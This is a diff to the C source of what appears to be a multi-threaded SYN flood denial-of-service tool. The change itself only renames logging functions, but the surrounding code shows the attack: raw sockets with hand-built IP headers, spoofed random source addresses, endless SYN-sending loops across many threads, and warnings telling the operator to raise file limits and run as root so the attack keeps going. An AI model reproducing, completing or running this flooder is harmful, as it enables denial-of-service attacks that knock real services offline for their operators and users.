@@ -25,10 +25,10 @@
 #include "main.h"
 
 // from ../core/core_log.c
-extern int DisplayDebug(const int message_debug_level, const int user_debug_level, const char *fmt, ...);
-extern int DisplayInfo(const char *fmt, ...);
-extern int DisplayWarning(const char *fmtsring, ...);
-extern int DisplayError(const char *fmt, ...);
+extern int Debug(const int message_debug_level, const int user_debug_level, const char *fmt, ...);
+extern int DebugInfo(const char *fmt, ...);
+extern int DebugWarning(const char *fmtsring, ...);
+extern int DebugError(const char *fmt, ...);
 
 extern unsigned short CalculateSum(unsigned short *ptr, int nbytes);
 
@@ -48,16 +48,16 @@ static int SendSYN(const pSYNStruct ss, const int debug_level)
     int socket_fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
     if (socket_fd < 0)
     {
-        DisplayError("Create socket failed: %s(%d)", strerror(errno), errno);
+        DebugError("Create socket failed: %s(%d)", strerror(errno), errno);
         if (errno == 1)
         {
-            DisplayWarning("This program should run as root user");
+            DebugWarning("This program should run as root user");
         }
         else if (errno == 24)
         {
-            DisplayWarning("You shoud check max file number use 'ulimit -n' in linux");
-            DisplayWarning("And change the max file number use 'ulimit -n <setting number>'");
-            DisplayWarning("Or you can change the EACH_IP_REPEAT_TIME value to delay the attack end time");
+            DebugWarning("You shoud check max file number use 'ulimit -n' in linux");
+            DebugWarning("And change the max file number use 'ulimit -n <setting number>'");
+            DebugWarning("Or you can change the EACH_IP_REPEAT_TIME value to delay the attack end time");
         }
         return 1;
     }
@@ -83,7 +83,7 @@ static int SendSYN(const pSYNStruct ss, const int debug_level)
     //memset(datagram, 0, 4096);
     if (!memset(datagram, 0, 4096))
     {
-        DisplayError("Attack memset failed");
+        DebugError("Attack memset failed");
         return 1;
     }
 
@@ -138,7 +138,7 @@ static int SendSYN(const pSYNStruct ss, const int debug_level)
 
     if (!memcpy(&psh.tcp, tcph, sizeof(struct tcphdr)))
     {
-        DisplayError("Attack memcpy failed");
+        DebugError("Attack memcpy failed");
         return 1;
     }
 
@@ -149,7 +149,7 @@ static int SendSYN(const pSYNStruct ss, const int debug_level)
     const int *val = &one;
     if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
     {
-        DisplayError("Error setting IP_HDRINCL: %s(%d)", strerror(errno), errno);
+        DebugError("Error setting IP_HDRINCL: %s(%d)", strerror(errno), errno);
         //exit(0);
         return 1;
     }
@@ -158,7 +158,7 @@ static int SendSYN(const pSYNStruct ss, const int debug_level)
     int len = sizeof(int);
     if (setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &flag, len) < 0)
     {
-        DisplayError("Error setting SO_REUSEADDR: %s(%d)", strerror(errno), errno);
+        DebugError("Error setting SO_REUSEADDR: %s(%d)", strerror(errno), errno);
         //exit(0);
         return 1;
     }
@@ -178,7 +178,7 @@ static int SendSYN(const pSYNStruct ss, const int debug_level)
                 (struct sockaddr *)&sin, // socket addr, just like in
                 sizeof(sin)) < 0)        // a normal send()
         {
-            DisplayError("Attack send failed");
+            DebugError("Attack send failed");
             //break;
         }
         // Data send successfull
@@ -217,18 +217,18 @@ static int AttackThread(pInput input)
 
     if (!SplitURL(input->address, &split_result))
     {
-        DisplayError("AttackThread SplitURL failed");
+        DebugError("AttackThread SplitURL failed");
         return 1;
     }
-    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->protocol);
-    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->host);
-    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %d", split_result->port);
-    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->suffix);
+    Debug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->protocol);
+    Debug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->host);
+    Debug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %d", split_result->port);
+    Debug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->suffix);
     if (split_result->port == 0)
     {
         if (strlen(split_result->host) == 0)
         {
-            DisplayError("AttackThread SplitURL not right");
+            DebugError("AttackThread SplitURL not right");
             return 1;
         }
         // make the port as default
@@ -238,24 +238,24 @@ static int AttackThread(pInput input)
     syn_struct->dst_ip = (char *)malloc(IP_BUFFER_SIZE);
     if (!(syn_struct->dst_ip))
     {
-        DisplayError("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
+        DebugError("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
         return 1;
     }
     if (!memset(syn_struct->dst_ip, 0, IP_BUFFER_SIZE))
     {
-        DisplayError("AttackThread memset failed: %s(%d)", strerror(errno), errno);
+        DebugError("AttackThread memset failed: %s(%d)", strerror(errno), errno);
         return 1;
     }
     if (!strncpy(syn_struct->dst_ip, split_result->host, strlen(split_result->host)))
     {
-        DisplayError("AttackThread strncpy failed: %s(%d)", strerror(errno), errno);
+        DebugError("AttackThread strncpy failed: %s(%d)", strerror(errno), errno);
         return 1;
     }
     syn_struct->dst_port = split_result->port;
     FreeSplitURLBuff(split_result);
     syn_struct->each_ip_repeat = input->each_ip_repeat;
 
-    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "AttackThread start sending data...");
+    Debug(DEBUG_LEVEL_3, input->debug_level, "AttackThread start sending data...");
     for (;;)
     {
         // here get the random ip address and port
@@ -263,7 +263,7 @@ static int AttackThread(pInput input)
         {
             if (!GetRandomIP(&(syn_struct->src_ip)))
             {
-                DisplayError("AttackThread GetRandomIP failed");
+                DebugError("AttackThread GetRandomIP failed");
                 return 1;
             }
             // this function has no failed
@@ -274,7 +274,7 @@ static int AttackThread(pInput input)
         {
             if (!strncpy(syn_struct->src_ip, DEFAULT_ADDRESS, strlen(DEFAULT_ADDRESS)))
             {
-                DisplayError("AttackThread copy SIP_ADDRESS failed: %s(%d)", strerror(errno), errno);
+                DebugError("AttackThread copy SIP_ADDRESS failed: %s(%d)", strerror(errno), errno);
                 return 1;
             }
             syn_struct->src_port = (int)DEFAULT_PORT;
@@ -285,7 +285,7 @@ static int AttackThread(pInput input)
         {
             if (SendSYN(syn_struct, input->debug_level))
             {
-                DisplayError("AttackThread Attack failed");
+                DebugError("AttackThread Attack failed");
                 //return 1;
             }
         }
@@ -304,7 +304,7 @@ int StartSYNFloodAttack(const pInput input)
     pthread_attr_t attr;
     int j, ret;
 
-    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartSYNFloodAttack");
+    Debug(DEBUG_LEVEL_3, input->debug_level, "Enter StartSYNFloodAttack");
     signal(SIGINT, SignalExit);
     // unlimit loop
     for (;;)
@@ -315,24 +315,24 @@ int StartSYNFloodAttack(const pInput input)
             //input->serial_num = (i * input->max_thread) + j;
             if (pthread_attr_init(&attr))
             {
-                DisplayError("StartSYNFloodAttack pthread_attr_init failed");
+                DebugError("StartSYNFloodAttack pthread_attr_init failed");
                 return 1;
             }
             //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
             if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
             {
-                DisplayError("StartSYNFloodAttack pthread_attr_setdetachstate failed");
+                DebugError("StartSYNFloodAttack pthread_attr_setdetachstate failed");
                 return 1;
             }
             // create thread
             ret = pthread_create(&tid[j], &attr, (void *)AttackThread, input);
             //printf("j is: %d\n", j);
-            DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "tid: %ld", tid[j]);
+            Debug(DEBUG_LEVEL_2, input->debug_level, "tid: %ld", tid[j]);
             // here we make a map
             if (ret != 0)
             {
-                DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "ret: %d", ret);
-                DisplayError("Create pthread failed");
+                Debug(DEBUG_LEVEL_2, input->debug_level, "ret: %d", ret);
+                DebugError("Create pthread failed");
                 return 1;
             }
             pthread_attr_destroy(&attr);
@@ -351,7 +351,7 @@ int StartSYNFloodTest(const pInput input)
 {
     // run function in thread
     // this attack type must run as root
-    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartSYNFloodTest");
+    Debug(DEBUG_LEVEL_3, input->debug_level, "Enter StartSYNFloodTest");
     AttackThread(input);
     return 0;
 }
